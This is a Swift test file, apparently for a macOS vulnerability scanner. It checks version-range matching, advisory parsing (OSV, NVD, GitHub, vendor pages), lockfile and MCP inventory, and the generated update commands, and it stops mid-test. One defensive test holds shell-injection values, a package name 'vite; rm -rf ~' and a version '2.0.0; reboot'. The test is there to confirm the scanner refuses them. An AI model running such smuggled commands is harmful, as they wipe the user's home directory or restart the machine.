import Foundation

@main struct RulesTests {
    static var count = 0
    static func expect(_ condition: @autoclosure () throws -> Bool, _ description: String) rethrows {
        count += 1
        if try !condition() { fatalError("FAIL: " + description) }
    }
    static func item(_ product: String, _ version: String) -> Installation {
        Installation(product: product, name: product, version: version, path: "/test/" + product, domain: "tools")
    }
    static func main() async throws {
        expect(Version("1.10.0")! > Version("1.9.9")!, "numeric ordering")
        expect(Version("1.2") == Version("1.2.0"), "trailing zero equivalence")
        expect(Version("v24.22.1") == Version("24.22.1"), "Node prefix")
        expect(Version("1.2.3-beta.1") == nil, "prerelease rejected")
        expect(Version("1.2.3_1") == nil, "package revisions need explicit normalization")
        expect(Version("1.3.13")!.matches(">= 1.3.14, < 1.4.4") == false, "Bun HTTP3 advisory does not affect 1.3.13")
        expect(Version("1.4.3")!.matches(">= 1.3.14, < 1.4.4") == true, "bounded range")
        expect(Version("1.4.4")!.matches("< 1.4.4") == false, "patched version excluded")
        expect(Version("1.4.4")!.matches("<=1.4.4") == true, "inclusive bound")
        expect(Version("2.0.1")!.matches("<1.0 || >=2.0, <3.0") == true, "OR range")
        expect(Version("1.4.4")!.matches("^1.4") == nil, "unsupported syntax remains unknown")
        expect(Version("1.4.4")!.matches("<2 >=1") == nil, "ambiguous range remains unknown")
        expect(Version("1.4.4")!.matches("") == nil, "empty range remains unknown")
        for (formula, product) in [("node", "node"), ("node@22", "node"), ("node-build", "node-build"), ("nodenv", "nodenv"), ("openssl@3", "openssl"),
                                   ("openssl-osx-ca", "openssl-osx-ca"), ("postgresql@16", "postgresql"), ("python@3.14", "python")] {
            expect(Inventory.product(forFormula: formula) == product, "Homebrew formula \(formula) maps to \(product)")
        }

        let schedule: [String: Any] = ["v24": ["end": "2028-04-30"], "v25": ["end": "2026-06-01"]]
        let releases: [[String: Any]] = [["version": "v26.12.1", "security": true], ["version": "v24.23.0", "security": false], ["version": "v24.22.1", "security": true], ["version": "v25.8.0", "security": false]]
        let date = ISO8601DateFormatter().date(from: "2026-10-24T00:00:00Z")!
        let node = try Rules.node(item("node", "24.14.0"), releases: releases, schedule: schedule, now: date)
        expect(node?.fixed == "24.22.1", "same-branch security target; no feature-only/major upgrade")
        try expect(Rules.node(item("node", "24.22.1"), releases: releases, schedule: schedule, now: date) == nil, "patched Node clear")
        try expect(Rules.node(item("node", "25.8.0"), releases: releases, schedule: schedule, now: date)?.kind == .unsupported, "unsupported Node branch")
        do { _ = try Rules.node(item("node", "29.0.0"), releases: releases, schedule: schedule, now: date); fatalError("missing branch should fail") } catch { count += 1 }
        let bun: [[String: Any]] = [["ghsa_id": "GHSA-test", "html_url": "https://github.com/oven-sh/bun/security/advisories/GHSA-test", "summary": "Test", "vulnerabilities": [["package": ["name": "bun"], "vulnerable_version_range": ">=1.3.14, <1.4.4", "patched_versions": "1.4.4"]]]]
        try expect(Rules.bun(item("bun", "1.3.13"), advisories: bun) == nil, "Bun lower boundary")
        try expect(Rules.bun(item("bun", "1.4.3"), advisories: bun)?.fixed == "1.4.4", "Bun affected")
        try expect(Rules.bun(item("bun", "1.4.4"), advisories: bun) == nil, "Bun patched")

        let postgres = "<a href='/support/security/16/'>16</a><table><tr><td>CVE-2026-12345</td><td>17, 16</td><td>17.11, 16.15</td><td>client</td><td>test</td></tr></table>"
        try expect(Rules.postgres(item("postgresql", "16.13"), html: postgres)?.fixed == "16.15", "Postgres same-major target")
        try expect(Rules.postgres(item("postgresql", "16.15"), html: postgres) == nil, "Postgres patched")
        do { _ = try Rules.postgres(item("postgresql", "16.13"), html: "<html>maintenance</html>"); fatalError("bad HTML should fail") } catch { count += 1 }
        let openssl = "<h2 id=\"CVE-2026-12345\">CVE-2026-12345</h2><li>from 3.6.0 before 3.6.5 </li><li>from 4.0.0 before 4.0.3 </li>"
        try expect(Rules.openssl(item("openssl", "3.6.4"), html: openssl)?.fixed == "3.6.5", "OpenSSL same branch")
        try expect(Rules.openssl(item("openssl", "4.0.3"), html: openssl) == nil, "OpenSSL patched")
        do { _ = try Rules.openssl(item("openssl", "3.6.4"), html: "<html>maintenance</html>"); fatalError("bad HTML should fail") } catch { count += 1 }
        let index = Rules.opensslIndexedBranches(#"<a href="/news/vulnerabilities-3.6/">3.6</a> <a href="/news/vulnerabilities-4.0">4.0</a> <a href="../vulnerabilities-1.1.1/index.html">1.1.1</a> <a href="/news/">News</a>"#)
        expect(index == ["3.6", "4.0", "1.1.1"], "OpenSSL index branch links, absolute, relative and index.html forms")
        expect(Rules.opensslUnpublished("4.1", indexed: index), "an unlisted new branch has no published vulnerabilities")
        expect(!Rules.opensslUnpublished("4.0", indexed: index), "a listed branch with a missing page stays a failure")
        expect(!Rules.opensslUnpublished("4.1", indexed: []), "an index with no branches never clears a branch")

        let old = ScanReport(installations: [item("node", "24.14.0")], findings: [node!], domains: ["tools": true])
        var failed = ScanReport(installations: old.installations, checks: [SourceCheck(id: "node", name: "Node", status: "failed", detail: "offline")], domains: ["tools": true])
        failed.retainUnverified(from: old)
        expect(failed.findings.count == 1 && failed.findings[0].stale, "failed feed preserves finding as stale")
        var unreadable = ScanReport(checks: [SourceCheck(id: "node", name: "Node", status: "checked", detail: "ok")], domains: ["tools": false])
        unreadable.retainUnverified(from: old)
        expect(unreadable.findings.count == 1, "failed inventory does not imply removal")
        var fixed = ScanReport(installations: [item("node", "24.22.1")], checks: [SourceCheck(id: "node", name: "Node", status: "checked", detail: "ok")], domains: ["tools": true])
        fixed.retainUnverified(from: old)
        expect(fixed.findings.isEmpty, "verified patched installation resolves finding")
        var removed = ScanReport(domains: ["tools": true])
        removed.retainUnverified(from: old)
        expect(removed.findings.isEmpty, "successful discovery confirms removal")
        var copy = node!; copy.links = ["https://nodejs.org/new-path"]; copy.reason = "Wording changed"
        expect(copy.fingerprint == node!.fingerprint, "wording/link edits do not repeat alerts")
        copy.fixed = "24.24.1"
        expect(copy.fingerprint != node!.fingerprint, "new fixed release triggers change")

        var gone = ScanReport(installations: old.installations, domains: ["tools": true])
        gone.retainUnverified(from: old)
        expect(gone.findings.isEmpty, "findings from a retired source are dropped, not kept as unverified")

        // Loose package ordering picks fix targets only.
        expect(looseLess("1.2.9", "1.2.10") && looseLess("2.0.0-beta.1", "2.0.0") && !looseLess("2.0.0", "2.0.0") && looseLess("v1.0", "1.0.1"), "loose package version ordering")
        expect(Set(Catalog.products.map(\.id)).count == Catalog.products.count && Catalog.vendorRules.allSatisfy { Catalog.byID[$0] != nil }, "catalog IDs are unique and vendor rules exist")

        // Lockfiles
        let npmLock = #"{"lockfileVersion":3,"packages":{"":{"dependencies":{"express":"^4"},"devDependencies":{"vite":"^5"}},"node_modules/express":{"version":"4.18.2"},"node_modules/vite":{"version":"5.0.0","dev":true},"node_modules/express/node_modules/qs":{"version":"6.11.0"},"node_modules/@scope/lib":{"version":"1.0.0"},"node_modules/linked":{"link":true},"packages/app":{"version":"0.0.1"}}}"#
        let npm = Set(Lockfiles.npm(Data(npmLock.utf8)).map { "\($0.name)@\($0.version):\($0.dependency ?? "")" })
        expect(npm == ["express@4.18.2:direct", "vite@5.0.0:dev", "qs@6.11.0:transitive", "@scope/lib@1.0.0:transitive"], "package-lock.json roles, nesting, scopes, links and workspaces")
        let pnpm = Lockfiles.pnpm("lockfileVersion: '9.0'\n\npackages:\n\n  '@babel/core@7.24.0':\n    resolution: {integrity: x}\n\n  react@18.3.1:\n    resolution: {}\n\nsnapshots:\n\n  react-dom@18.3.1(react@18.3.1):\n    dependencies: {}\n")
            + Lockfiles.pnpm("packages:\n  /lodash@4.17.20:\n    resolution: {}\n  /@types/node@20.1.0(x@1.0.0):\n    dev: true\n  /left-pad/1.3.0_peer@1.0.0:\n    dev: false\n")
        expect(pnpm.map { $0.name + "@" + $0.version } == ["@babel/core@7.24.0", "react@18.3.1", "lodash@4.17.20", "@types/node@20.1.0", "left-pad@1.3.0"], "pnpm lockfile v9, v6 and v5 keys; snapshots skipped")
        let yarn = Lockfiles.yarn("# yarn lockfile v1\n\n\"@babel/code-frame@^7.0.0\", \"@babel/code-frame@^7.22.13\":\n  version \"7.24.7\"\n  resolved \"x\"\n\nlodash@^4.17.21:\n  version \"4.17.21\"\n")
            + Lockfiles.yarn("__metadata:\n  version: 8\n\n\"axios@npm:^1.6.0\":\n  version: 1.6.8\n\n\"my-app@workspace:.\":\n  version: 0.0.0-use.local\n\n\"resolve@patch:resolve@npm%3A^1.20.0#~builtin<compat/resolve>\":\n  version: 1.22.8\n")
        expect(yarn.map { $0.name + "@" + $0.version } == ["@babel/code-frame@7.24.7", "lodash@4.17.21", "axios@1.6.8"], "yarn v1 and Berry entries; workspaces and patches skipped")
        let bunLock = Lockfiles.bun("{\n  \"workspaces\": { \"\": { \"name\": \"app\" } },\n  \"packages\": {\n    \"react\": [\"react@18.3.1\", \"\", {}, \"sha512-x\"],\n    \"@types/node\": [\"@types/node@20.0.0\", \"\", {}, \"sha512-y\"],\n    \"local\": [\"local@workspace:packages/local\"],\n  }\n}")
        expect(bunLock.map { $0.name + "@" + $0.version } == ["react@18.3.1", "@types/node@20.0.0"], "bun.lock text format")
        let uv = Lockfiles.toml("version = 1\n\n[[package]]\nname = \"app\"\nversion = \"0.1.0\"\nsource = { editable = \".\" }\n\n[[package]]\nname = \"requests\"\nversion = \"2.31.0\"\nsource = { registry = \"https://pypi.org/simple\" }\ndependencies = [\n    { name = \"idna\" },\n]\n\n[package.optional-dependencies]\nsocks = [{ name = \"pysocks\" }]\n", ecosystem: "PyPI") { !$0.contains("editable") }
        expect(uv.map { $0.name + "@" + $0.version } == ["requests@2.31.0"], "uv.lock packages, editable project skipped")
        let cargo = Lockfiles.toml("[[package]]\nname = \"serde\"\nversion = \"1.0.190\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"mycrate\"\nversion = \"0.1.0\"\n", ecosystem: "crates.io") { $0.contains("registry+") }
        expect(cargo.map(\.name) == ["serde"], "Cargo.lock registry crates only")
        expect(Lockfiles.requirements("# deps\nDjango==4.2.1\nrequests[socks] == 2.31.0 ; python_version > '3'\nflask>=2\n-e .\n").map { $0.name + "@" + $0.version } == ["Django@4.2.1", "requests@2.31.0"], "pinned requirements only")
        expect(Lockfiles.gemfile("GEM\n  remote: https://rubygems.org/\n  specs:\n    nokogiri (1.16.0-arm64-darwin)\n      racc (~> 1.4)\n    rake (13.0.6)\n\nPLATFORMS\n  arm64-darwin\n").map { $0.name + "@" + $0.version } == ["nokogiri@1.16.0", "rake@13.0.6"], "Gemfile.lock specs")
        expect(Lockfiles.goModules("module x\n\ngo 1.22\n\nrequire golang.org/x/net v0.17.0\n\nrequire (\n\tgithub.com/a/b v1.2.3\n\tgithub.com/c/d v0.0.0-2023 // indirect\n)\n").map { "\($0.name)@\($0.version):\($0.dependency!)" } == ["golang.org/x/net@0.17.0:direct", "github.com/a/b@1.2.3:direct", "github.com/c/d@0.0.0-2023:transitive"], "go.mod requirements")

        // MCP server commands
        expect(Inventory.mcpPackage(command: "npx", args: ["-y", "@modelcontextprotocol/server-github"])! == ("npm", "@modelcontextprotocol/server-github"), "npx -y package")
        expect(Inventory.mcpPackage(command: "/usr/local/bin/uvx", args: ["--python", "3.12", "mcp-server-fetch==0.6.2"])! == ("PyPI", "mcp-server-fetch==0.6.2"), "uvx skips flag values")
        expect(Inventory.mcpPackage(command: "pnpm", args: ["dlx", "mcp-remote", "https://example.com/sse?token=secret"])! == ("npm", "mcp-remote"), "pnpm dlx keeps only the package")
        expect(Inventory.mcpPackage(command: "node", args: ["server.js"]) == nil, "local scripts are not packages")
        expect(Inventory.pinned("@acme/mcp@1.2.3", "npm") == ("@acme/mcp", "1.2.3") && Inventory.pinned("@acme/mcp@latest", "npm") == ("@acme/mcp", nil) && Inventory.pinned("mcp-server-fetch==0.6.2", "PyPI") == ("mcp-server-fetch", "0.6.2") && Inventory.pinned("pkg[extra]", "PyPI") == ("pkg", nil), "MCP pins and tags")

        // OSV: aliases collapse, the highest needed fix wins, malicious versions are flagged.
        let pip = Installation(product: "pypi:pip", name: "pip", version: "26.2.1", path: "/py/pip", domain: "packages", ecosystem: "PyPI", packageName: "pip", manager: "pip", location: "/py/bin/python3")
        let osvKey = OSV.key(pip)!
        let vulns = ["GHSA-a": OSV.Vuln(id: "GHSA-a", summary: "Cert issue", aliases: ["PYSEC-1", "CVE-2026-1"], severity: "HIGH", fixed: ["PyPI|pip": ["26.2.2", "25.0"]]),
                     "PYSEC-1": OSV.Vuln(id: "PYSEC-1", summary: "Same issue", aliases: ["GHSA-a"], severity: nil, fixed: ["PyPI|pip": ["26.2.2"]]),
                     "GHSA-b": OSV.Vuln(id: "GHSA-b", summary: "Other", aliases: [], severity: "MODERATE", fixed: ["PyPI|pip": ["26.3.0"]])]
        let osvFinding = OSV.findings(for: [pip], matches: [osvKey: ["PYSEC-1", "GHSA-a", "GHSA-b"]], vulns: vulns).first!
        expect(osvFinding.fixed == "26.3.0" && osvFinding.severity == "HIGH" && osvFinding.advisories == ["CVE-2026-1", "GHSA-a", "GHSA-b"] && osvFinding.reason.hasPrefix("2 published"), "OSV alias collapse, fix target and severity")
        let evil = Installation(product: "npm:evil", name: "evil", version: "1.0.0", path: "/p#evil@1.0.0", domain: "projects", ecosystem: "npm", packageName: "evil", manager: "npm", location: "/p", dependency: "transitive")
        let malicious = OSV.findings(for: [evil], matches: [OSV.key(evil)!: ["MAL-2026-1"]], vulns: ["MAL-2026-1": OSV.Vuln(id: "MAL-2026-1", summary: "Malicious code", aliases: [], severity: "CRITICAL", fixed: [:])]).first!
        expect(malicious.malicious == true && Commands.commands(for: malicious).first?.text == "cd /p && npm uninstall evil", "malicious package is flagged with a removal command")

        // NVD: bounded ranges and exact versions count; unbounded wildcards and other platforms do not.
        func cve(_ match: String, platform: String? = nil) -> [String: Any] {
            let config = try! JSONSerialization.jsonObject(with: Data(match.utf8)) as! [String: Any]
            var nodes: [[String: Any]] = [["operator": "OR", "cpeMatch": [config]]]
            if let platform { nodes.append(["operator": "OR", "cpeMatch": [["vulnerable": false, "criteria": platform]]]) }
            return ["id": "CVE-2026-9", "configurations": [["operator": platform == nil ? "OR" : "AND", "nodes": nodes]], "metrics": ["cvssMetricV31": [["cvssData": ["baseSeverity": "HIGH"]]]]]
        }
        let v = Version("8.5.0")!
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*","versionStartIncluding":"7.0","versionEndExcluding":"8.6.0"}"#), cpe: "haxx:curl", version: v) == NVDHit(id: "CVE-2026-9", fixed: "8.6.0", severity: "HIGH"), "bounded NVD range")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*","versionEndExcluding":"8.5.0"}"#), cpe: "haxx:curl", version: v) == nil, "fixed version excluded")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*"}"#), cpe: "haxx:curl", version: v) == nil, "unbounded wildcard ignored")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:8.5.0:*:*:*:*:*:*:*"}"#), cpe: "haxx:curl", version: v)?.fixed == nil, "exact version match")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:8.5.0:alpha1:*:*:*:*:*:*"}"#), cpe: "haxx:curl", version: v) == nil, "pre-release CPE does not match a final release")
        let unmaintained = OSV.findings(for: [pip], matches: [osvKey: ["RUSTSEC-1"]], vulns: ["RUSTSEC-1": OSV.Vuln(id: "RUSTSEC-1", summary: "Unmaintained", aliases: [], severity: nil, fixed: [:], informational: true)])
        expect(unmaintained.isEmpty, "unmaintained notices are not security findings")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*","versionEndExcluding":"9"}"#, platform: "cpe:2.3:o:microsoft:windows:-:*:*:*:*:*:*:*"), cpe: "haxx:curl", version: v) == nil, "Windows-only configuration ignored")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*","versionEndExcluding":"9"}"#, platform: "cpe:2.3:o:apple:macos:-:*:*:*:*:*:*:*"), cpe: "haxx:curl", version: v) != nil, "macOS configuration applies")

        // Commands are quoted, validated and match the installation's manager.
        expect(Shell.quote("plain-1.2/x") == "plain-1.2/x" && Shell.quote("/Volumes/My Projects/it's") == "'/Volumes/My Projects/it'\\''s'", "shell quoting")
        func commandFor(_ item: Installation, fixed: String = "2.0.0") -> String? { Commands.commands(for: Finding(source: "osv", installation: item, kind: .security, fixed: fixed, reason: "", action: "", links: [])).first?.text }
        let project = Installation(product: "npm:vite", name: "vite", version: "5.0.0", path: "/a#vite", domain: "projects", ecosystem: "npm", packageName: "vite", manager: "npm", location: "/Volumes/My Projects/app", dependency: "dev")
        expect(commandFor(project) == "cd '/Volumes/My Projects/app' && npm install vite@2.0.0 --save-dev", "npm dev dependency command")
        var transitive = project; transitive.dependency = "transitive"
        expect(commandFor(transitive) == "cd '/Volumes/My Projects/app' && npm audit fix", "npm transitive dependency command")
        var hostile = project; hostile.packageName = "vite; rm -rf ~"
        expect(commandFor(hostile) == nil, "invalid package names get no command")
        expect(commandFor(project, fixed: "2.0.0; reboot") == "cd '/Volumes/My Projects/app' && npm audit fix", "invalid fix versions are never placed in commands")
        expect(commandFor(pip) == "/py/bin/python3 -m pip install --upgrade pip==2.0.0", "pip command uses the owning interpreter")
        expect(commandFor(Installation(product: "node", name: "Node.js", version: "24.14.0", path: "/usr/local/bin/node", domain: "tools", manager: "node-pkg"), fixed: "24.22.1")!.contains("spctl --assess --type install node-v24.22.1.pkg && sudo installer"), "Node installer checks notarization first")
        expect(commandFor(Installation(product: "curl", name: "curl", version: "8.5.0", path: "/opt/homebrew/Cellar/curl/8.5.0", domain: "brew", package: "curl", manager: "brew")) == "brew upgrade curl", "Homebrew formula command")
        expect(commandFor(Installation(product: "pypi:requests", name: "requests", version: "2.0", path: "/u#r", domain: "projects", ecosystem: "PyPI", packageName: "requests", manager: "uv", location: "/u")) == "cd /u && uv lock --upgrade-package requests && uv sync", "uv project command")
        expect(commandFor(Installation(product: "go:x", name: "golang.org/x/net", version: "0.17.0", path: "/g#x", domain: "projects", ecosystem: "Go", packageName: "golang.org/x/net", manager: "go", location: "/g"), fixed: "0.23.0") == "cd /g && go get golang.org/x/net@v0.23.0 && go mod tidy", "Go module command")

        // Catalog additions: renamed and alternate casks, libpq, versioned Go module paths.
        expect(Catalog.product(formula: "libpq")?.id == "postgresql" && Catalog.product(formula: "docker-compose")?.id == "docker-compose" && Catalog.product(formula: "docker")?.id == "docker-cli"
               && Catalog.byCask["claude-code@latest"]?.id == "claude-code" && Catalog.byCask["ollama-app"]?.id == "ollama" && Catalog.byCask["copilot-cli"]?.id == "copilot-cli"
               && Catalog.product(formula: "opencode")?.id == "opencode" && Catalog.byBundleID["com.ollama.ollama"]?.id == "ollama", "new catalog mappings")
        let compose = Catalog.byID["docker-compose"]
        expect(Catalog.osv(compose, version: "5.6.1")?.name == "github.com/docker/compose/v5" && Catalog.osv(compose, version: "2.40.1")?.name == "github.com/docker/compose/v2"
               && Catalog.osv(compose, version: "1.29.2")?.name == "github.com/docker/compose" && Catalog.osv(Catalog.byID["claude-code"], version: "2.1.0")?.name == "@anthropic-ai/claude-code", "OSV module path follows the major version")

        // GitHub repository advisories: open-ended ranges stop at the patched release; empty-ecosystem packages count.
        let opencodeAdvisories: [[String: Any]] = [
            ["ghsa_id": "GHSA-open", "html_url": "https://github.com/anomalyco/opencode/security/advisories/GHSA-open", "summary": "Open-ended", "vulnerabilities": [["package": ["ecosystem": "npm", "name": "opencode-ai"], "vulnerable_version_range": ">=1.14.30", "patched_versions": "1.18.22"]]],
            ["ghsa_id": "GHSA-old", "html_url": "https://github.com/anomalyco/opencode/security/advisories/GHSA-old", "summary": "Old", "vulnerabilities": [["package": ["ecosystem": "", "name": "opencode"], "vulnerable_version_range": "<1.1.10", "patched_versions": "1.1.10"]]]]
        func opencode(_ version: String) throws -> Finding? { try Rules.github(item("opencode", version), advisories: opencodeAdvisories, packages: ["opencode-ai", "opencode"], source: "opencode", action: "") }
        try expect(opencode("2.1.4") == nil, "a version past the patched release is clear despite an open-ended range")
        try expect(opencode("1.15.0")?.fixed == "1.18.22" && opencode("1.1.9")?.advisories == ["GHSA-old"], "OpenCode ranges match by package name")

        // mise installs: real versions only, alias symlinks skipped, Python packages and Node globals included.
        let mise = FileManager.default.temporaryDirectory.appendingPathComponent("mise-test-\(UUID().uuidString)").path
        defer { try? FileManager.default.removeItem(atPath: mise) }
        for path in ["node/24.14.0/bin", "node/24.14.0/lib/node_modules/left-pad", "python/3.12.4/lib/python3.12/site-packages/foo-1.0.dist-info", "go/1.22.0/bin", "zig/0.13.0"] {
            try FileManager.default.createDirectory(atPath: mise + "/" + path, withIntermediateDirectories: true)
        }
        try FileManager.default.createSymbolicLink(atPath: mise + "/node/24", withDestinationPath: "24.14.0")
        try FileManager.default.createSymbolicLink(atPath: mise + "/node/latest", withDestinationPath: "24.14.0")
        try Data("Metadata-Version: 2.1\nName: foo\nVersion: 1.0\n".utf8).write(to: URL(fileURLWithPath: mise + "/python/3.12.4/lib/python3.12/site-packages/foo-1.0.dist-info/METADATA"))
        try Data(#"{"name":"left-pad","version":"1.3.0"}"#.utf8).write(to: URL(fileURLWithPath: mise + "/node/24.14.0/lib/node_modules/left-pad/package.json"))
        let found = Inventory.mise(root: mise)
        expect(found.filter { $0.manager == "mise" }.map { "\($0.product)@\($0.version)" }.sorted() == ["go@1.22.0", "node@24.14.0", "python@3.12.4"], "mise runtimes found; aliases and unknown tools skipped")
        expect(found.first { $0.product == "go" }?.packageName == "stdlib" && found.first { $0.name == "foo" }?.location == mise + "/python/3.12.4/bin/python3.12"
               && found.first { $0.name == "left-pad" }?.location == mise + "/node/24.14.0/bin/npm", "mise Go uses OSV stdlib; packages use mise's interpreter and npm")
        let miseNode = found.first { $0.product == "node" && $0.manager == "mise" }!
        expect(Commands.commands(for: Finding(source: "node", installation: miseNode, kind: .security, fixed: "24.22.1", reason: "", action: "", links: [])).map(\.text) == ["mise upgrade node", "mise use -g node@24.22.1"], "mise update commands")
        expect(Commands.commands(for: Finding(source: "node", installation: miseNode, kind: .unsupported, fixed: "Supported LTS branch", reason: "", action: "", links: [])).map(\.text) == ["mise upgrade --bump node"], "unsupported mise branch moves past its range")
        expect(commandFor(Installation(product: "opencode", name: "OpenCode", version: "1.15.0", path: "/o", domain: "tools", manager: "opencode")) == "opencode upgrade", "OpenCode native command")

        // Update options are ranked by install method, the tools on this Mac and whether the app updates itself.
        func options(_ item: Installation, _ context: CommandContext, source: String = "osv", fixed: String = "2.0.0") -> [UpdateCommand] {
            Commands.commands(for: Finding(source: source, installation: item, kind: .security, fixed: fixed, reason: "", action: "", links: []), context: context)
        }
        let codeApp = Installation(product: "vscode", name: "Visual Studio Code", version: "1.90", path: "/Applications/Visual Studio Code.app", domain: "apps", package: "visual-studio-code", manager: "app")
        expect(options(codeApp, CommandContext(tools: [])).map { $0.kind ?? "terminal" } == ["app", "link"] && options(codeApp, CommandContext(tools: []))[1].target == "https://code.visualstudio.com/download",
               "without Homebrew: open the app, then the vendor download page")
        var selfUpdating = CommandContext(tools: ["brew"]); selfUpdating.casks["visual-studio-code"] = CaskInfo(autoUpdates: true, homepage: "https://code.visualstudio.com/")
        expect(options(codeApp, selfUpdating).map { $0.kind ?? $0.text } == ["app", "brew install --cask --force visual-studio-code", "link"], "self-updating app: its updater first, Homebrew second")

        // Google Chrome and App Store apps are never inventoried.
        let applications = FileManager.default.temporaryDirectory.appendingPathComponent("apps-test-\(UUID().uuidString)").path
        defer { try? FileManager.default.removeItem(atPath: applications) }
        for (folder, bundleID, store) in [("Visual Studio Code.app", "com.microsoft.VSCode", false), ("Google Chrome.app", "com.google.Chrome", false),
                                          ("Tailscale.app", "io.tailscale.ipn.macos", true), ("Keynote.app", "com.apple.iWork.Keynote", true)] {
            let contents = applications + "/" + folder + "/Contents"
            try FileManager.default.createDirectory(atPath: contents + (store ? "/_MASReceipt" : ""), withIntermediateDirectories: true)
            if store { try Data("receipt".utf8).write(to: URL(fileURLWithPath: contents + "/_MASReceipt/receipt")) }
            try PropertyListSerialization.data(fromPropertyList: ["CFBundleIdentifier": bundleID, "CFBundleShortVersionString": "1.0"], format: .xml, options: 0).write(to: URL(fileURLWithPath: contents + "/Info.plist"))
        }
        let (foundApps, _, skipped) = Inventory.apps(roots: [applications])
        expect(foundApps.map(\.product) == ["vscode"] && skipped == 3, "Chrome and App Store copies are skipped; other catalog apps are found")
        expect(Catalog.byID["chrome"] == nil && Catalog.excludedCasks.contains("google-chrome") && !Catalog.vendorRules.contains("chrome"), "Chrome has no catalog entry, cask or vendor rule")
        let plainApp = Installation(product: "tool-x", name: "Tool X", version: "1.0", path: "/Applications/Tool X.app", domain: "apps", package: "tool-x", manager: "app")
        var manual = CommandContext(tools: ["brew"]); manual.casks["tool-x"] = CaskInfo(autoUpdates: false, homepage: "https://tool-x.example/")
        expect(options(plainApp, manual).map { $0.kind ?? "terminal" } == ["terminal", "link", "app"] && options(plainApp, manual)[1].text == "Download from tool-x.example", "app without a self-updater: Homebrew, then download page")
        var insecure = CommandContext(tools: []); insecure.casks["tool-x"] = CaskInfo(autoUpdates: false, homepage: "http://tool-x.example/")
        expect(options(plainApp, insecure).map { $0.kind ?? "terminal" } == ["app"], "non-https pages are never offered")
        let cask = Installation(product: "tool-x", name: "Tool X", version: "1.0", path: "/opt/homebrew/Caskroom/tool-x/1.0", domain: "brew", package: "tool-x", manager: "cask")
        var greedy = CommandContext(tools: ["brew"]); greedy.casks["tool-x"] = CaskInfo(autoUpdates: true, homepage: nil)
        expect(options(cask, greedy).first?.text == "brew upgrade --cask --greedy tool-x" && options(cask, .all).first?.text == "brew upgrade --cask tool-x", "self-updating casks need --greedy")

        // Missing package managers get an install step or an install page.
        let pnpmProject = Installation(product: "npm:left-pad", name: "left-pad", version: "1.0.0", path: "/p/pnpm-lock.yaml#left-pad@1.0.0", domain: "projects", ecosystem: "npm", packageName: "left-pad", manager: "pnpm", location: "/p", dependency: "direct")
        expect(options(pnpmProject, CommandContext(tools: ["corepack", "npm"])).first?.text == "corepack enable pnpm && cd /p && pnpm add left-pad@2.0.0", "pnpm through corepack")
        expect(options(pnpmProject, CommandContext(tools: ["npm"])).first?.text == "npm install -g pnpm && cd /p && pnpm add left-pad@2.0.0", "pnpm through npm")
        let uvProject = Installation(product: "pypi:requests", name: "requests", version: "2.0", path: "/u/uv.lock#requests@2.0", domain: "projects", ecosystem: "PyPI", packageName: "requests", manager: "uv", location: "/u")
        expect(options(uvProject, CommandContext(tools: ["brew"])).first?.text == "brew install uv && cd /u && uv lock --upgrade-package requests && uv sync", "uv through Homebrew")
        let noUV = options(uvProject, CommandContext(tools: []))
        expect(noUV.map { $0.kind ?? "terminal" } == ["link", "terminal"] && noUV[0].target == "https://docs.astral.sh/uv/getting-started/installation/", "uv install page first when nothing can install it")

        // Apple, files and download-only routes.
        let apple = Installation(product: "macos", name: "Apple software", version: "27.0", path: "System Settings → Software Update", domain: "apple")
        expect(options(apple, .all, source: "apple").first == UpdateCommand(text: "Open Software Update", note: "Shows Apple's eligible updates with their security notes.", kind: "link", target: "x-apple.systempreferences:com.apple.Software-Update-Settings.extension"), "Apple updates open Software Update")
        let pinned = Installation(product: "pypi:django", name: "Django", version: "4.2.1", path: "/r/requirements.txt#Django@4.2.1", domain: "projects", ecosystem: "PyPI", packageName: "Django", manager: "pip-req", location: "/r")
        expect(options(pinned, .all).first?.kind == "file" && options(pinned, .all).first?.target == "/r/requirements.txt", "pinned requirements open the file")
        let server = Installation(product: "mcp:x", name: "x (x)", version: "1.0.0", path: "/c.json#x", domain: "mcp", ecosystem: "npm", packageName: "x", manager: "mcp", location: "/Users/a/.cursor/mcp.json")
        expect(options(server, .all).first?.target == "/Users/a/.cursor/mcp.json", "MCP findings open the config")
        expect(options(Installation(product: "go", name: "Go", version: "1.22.0", path: "/usr/local/go", domain: "tools", manager: "go-pkg"), .all).first?.kind == "link", "go.dev installs get a download link")

        // No fix released yet: NVD lists no fixed version and Homebrew has nothing newer than the installed copy.
        func described(_ text: String) -> [String: Any] { ["id": "CVE-2026-1", "descriptions": [["lang": "en", "value": text]]] }
        expect(NVD.expectedFix(described("In MIT Kerberos 5 (aka krb5) before 1.22.3, there is a NULL pointer dereference."), version: Version("1.22.2")!) == "1.22.3", "fix version named in the description")
        expect(NVD.expectedFix(described("FFmpeg before 8.1.3 and 9.x before 9.0.2 contains an issue."), version: Version("9.0.2")!) == nil
               && NVD.expectedFix(described("FFmpeg through 9.0.2 contains a stack exhaustion vulnerability."), version: Version("9.0.2")!) == nil, "no future fix named")
        let krb5 = Installation(product: "krb5", name: "krb5", version: "1.22.2", path: "/opt/homebrew/Cellar/krb5/1.22.2_2", domain: "brew", package: "krb5", manager: "brew")
        let krbFinding = NVD.finding(krb5, product: Catalog.byID["krb5"]!, hits: [NVDHit(id: "CVE-2026-40355", fixed: nil, severity: "MEDIUM", expected: "1.22.3"), NVDHit(id: "CVE-2026-40356", fixed: nil, severity: "MEDIUM", expected: "1.22.3")])!
        expect(krbFinding.fixed == "1.22.3" && krbFinding.expectedFix == "1.22.3" && krbFinding.reason.contains("names 1.22.3"), "expected fix carried into the finding")
        var waiting = [krbFinding]
        Scanner.markAwaiting(&waiting, newest: ["krb5": "1.22.2"])
